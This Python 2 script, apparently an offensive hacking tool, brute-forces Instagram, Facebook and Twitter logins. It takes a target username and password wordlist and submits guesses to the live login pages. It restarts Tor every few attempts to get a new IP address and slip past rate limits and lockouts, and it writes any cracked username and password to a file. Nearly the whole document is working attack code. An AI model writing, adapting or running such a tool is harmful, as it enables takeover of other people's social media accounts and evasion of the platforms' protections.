#!/usr/bin/env python
#
# Brute Forces Facebook, Instagram & Twitter
#
# @Author: Ethical H4CK3R
#
# Kali Linux Only
#
import os
import time
import socks
import socket
import random
import cookielib
import mechanize
import subprocess

from Core import conf
from platform import platform
from Core.conf import userAgent

class Browser(object):
 def __init__(self):
  self.br    = None
  self.html  = None
  self.getIp = 'https://wtfismyip.com/text'

 def setup(self):
  if not engine.tries:
   engine.display()
   print '  [-] Setting Up Browser {}...{}'.format(G,W);time.sleep(1.5)
  if self.br:self.br.close()
  self.br=mechanize.Browser()
  self.br.set_handle_robots(False)
  self.br.set_handle_equiv(True)
  self.br.set_handle_referer(True)
  self.br.set_handle_redirect(True)
  self.br.set_cookiejar(cookielib.LWPCookieJar())
  self.br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
  self.br.addheaders=[('User-agent',userAgent())]

 def Id(self): # Returns current ip address
  return self.br.open(self.getIp).read()

 def visit(self):
  if not engine.tries:
   engine.display()
   site='Instagram' if website==1 else 'Facebook' if website==2 else 'Twitter' if website==3 else None
   print '  [-] Contacting {} {}...{}'.format(site,G,W);time.sleep(1.5)
  try:self.br.open(url)
  except:self.refresh()

 def refresh(self):
  Proxy().newId()
  engine.ipAdd=self.Id()
  self.visit()

 def fillForm(self,pwrd):
  try:
   self.br.select_form(nr=0)
   self.br.form[password]=pwrd
  except:self.refresh()

  try:self.br.form[username]=email
  except:pass

 def login(self,password):
  if engine.alive:
   self.fillForm(password)
   try:self.br.submit()
   except:pass
   try:self.html=self.br.response().read()
   except:return
   response=self.authenticate()
   if response:
    self.accessGranted()
   if response==False:
    self.login(password)
   self.lock()

 def authenticate(self):
  if any([not'login' in self.br.geturl(),'home.php' in self.br.geturl(),'challenge' in self.br.geturl(),'checkpoint' in self.br.geturl()]):
   if not 'lock' in self.br.geturl():
    return True
   else:
    self.refresh()
    engine.display()
    return False

 def accessGranted(self):
  site='Instagram' if website==1 else 'Facebook' if website==2 else 'Twitter'
  engine.display()
  with open('Cracked.txt','a+') as save:
   if not email in save and not engine.passw in save:
    save.write('Site: {}\nUsername: {}\nPassword: {}\n\n'.format(site,email,engine.passw))
  print '  [-]{} Access Granted{}'.format(G,W)
  print '  [-] Username: {}{}{}'.format(G,email,W)
  print '  [-] Password: {}{}{}'.format(G,engine.passw,W)
  engine.alive=False

 def lock(self):
  if 'try again later' in self.html:
   engine.lock=True
   engine.display()
   subprocess.Popen(['service','tor','stop']).wait()
   exit('\n{1}The Account Is {0}Locked{1} Try Again Later'.format(R,W))

class Proxy(object):
 def newId(self):
  self.restart()
  self.proxyIp()

 # proxy config
 def proxyIp(self):
  socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
  socket.socket=socks.socksocket
  connects=self.connection
  socket.connects=connects

 def connection(self,address,timeout=None,source_address=None):
  sock=socks.socksocket()
  sock.connect(address)
  return sock

 def restart(self):
  if not engine.tries:
   engine.display()
   print '  [-] Starting Tor {}...{}'.format(G,W);time.sleep(1.5)
  subprocess.Popen(['service','tor','restart']).wait()
  time.sleep(3)
  self.proxyIp()

 # Get Ip address
 def IpAddress(self):
  if not engine.tries:
   engine.display()
   print '  [-] Obtaining Proxy Ip {}...{}'.format(G,W);time.sleep(1.5)
  return engine.brwsr.Id()

class Engine(object):
 def __init__(self):
  self.atmpt = 0
  self.tries = 0
  self.alive = True
  self.ipAdd = None
  self.lock  = None
  self.passw = None
  self.brwsr = Browser()
  self.email = email
  self.list  = wordlist

  # Flexability
  self.url      = url
  self.maxTries = 15
  self.username = username # The email/username field of the site
  self.password = password # The password field name of the site

 def read(self):
  with open(self.list) as list:
   for password in list:
    yield password.replace('\n','')

 def config(self):
  Proxy().newId()# Change Ip
  self.brwsr.setup()
  time.sleep(1.5)

  self.ipAdd=Proxy().IpAddress() # Fetch Ip
  self.display()
  time.sleep(1.5)

  self.brwsr.visit() # Open url
  self.display()
  time.sleep(1.5)

  self.lock=False
  self.display()
  time.sleep(1.5)

  print '  [-] Starting Brute Force Session {}...{}'.format(G,W);time.sleep(3)
  self.display()
  time.sleep(1.5)

 def display(self):
  self.ipAdd=self.ipAdd if self.ipAdd else ''
  art(password = self.passw,attempts=self.tries,
      username = self.email,wordlist=self.list,
      proxyIp  = self.ipAdd.replace('\n',''),
      locked   = self.lock,
      website  = website)

 def attack(self):
  for password in self.read():
   self.passw=password

   if not self.alive:break
   if self.atmpt==self.maxTries:
    self.brwsr.setup()
    self.brwsr.refresh()
    self.atmpt=0

   self.tries+=1
   self.atmpt+=1
   self.display()
   self.brwsr.login(password)

 def ai(self):
  self.config()
  self.attack()

if __name__ == '__main__':

 # Root access only
 if os.getuid():
  exit('root access required')

 # Kali linux Only
 if not 'kali' in platform():
  exit('Kali linux required') 

 # Links
 instagram = 'https://www.instagram.com/accounts/login/?force_classic_login'
 facebook  = 'https://mbasic.facebook.com/login.php'
 twitter   = 'https://m.twitter.com/login/'

 # Colors
 R=conf.Colors[0]
 G=conf.Colors[1]
 W=conf.Colors[2]

 # Displays art
 def art(username=None,wordlist=None,password=None,attempts=None,proxyIp=None,locked=None,website=None):
  # Config display
  subprocess.call(['clear'])
  proxyIp=proxyIp   if proxyIp  else ''
  username=username if username else ''
  wordlist=wordlist if wordlist else ''
  password=password if password else ''
  attempts=attempts if attempts else ''
  website='Facebook' if website==2 else 'Instagram' if website==1 else 'Twitter' if website==3 else ''
  locked=locked if locked else '' if locked==None else locked
  color=R if locked else G

  print ''
  print '  {}[-] Website:  {}{}'.format(W,G,website)
  print '  {}[-] Proxy Ip: {}{}'.format(W,G,proxyIp)
  print '  {}[-] Wordlist: {}{}'.format(W,G,wordlist)
  print '  {}[-] Username: {}{}'.format(W,G,username)
  print '  {}[-] Password: {}{}'.format(W,G,password)
  print '  {}[-] Attempts: {}{}'.format(W,G,attempts)
  if website=='Facebook':
   print '  {}[-] Account Locked: {}{}'.format(W,color,locked)
  print '\n{}+-------------------+{}\n'.format(R,W)

 try:
  art()
  time.sleep(1.3)
  website=input('{0}[{1}Sites{0}]{1}\n\n1) Instagram\n2)\
 Facebook\n3) Twitter\n\nEnter Site:{0} '.format(G,W))
  print(W)
  time.sleep(.7)

  art(website=website)
  email=raw_input('Enter Username:{} '.format(G))
  email=email.title().replace('\n','')
  time.sleep(.7)
  art(website=website,username=email)

  wordlist=raw_input('Enter Wordlist: {}'.format(G))
  time.sleep(.7)

  # Set fields
  if website==2:url,username,password=facebook,'email','pass'
  elif website==1:url,username,password=instagram,'username','password'
  else:url,username,password=twitter,'session[username_or_email]','session[password]'

  # Locate wordlist
  if not os.path.exists(wordlist):
   exit('\n{0}{1}{2} is not found'.format(R,wordlist,W))

  art(website=website,username=email,wordlist=wordlist)
  time.sleep(1.2)

  # Configure system enviroment
  conf.config()

  # Start process
  engine=Engine()
  engine.ai()

 except KeyboardInterrupt:
  print '\n\n{1}Exiting {0}...{1}'.format(R,W)
 finally:
  subprocess.Popen(['service','tor','stop']).wait()
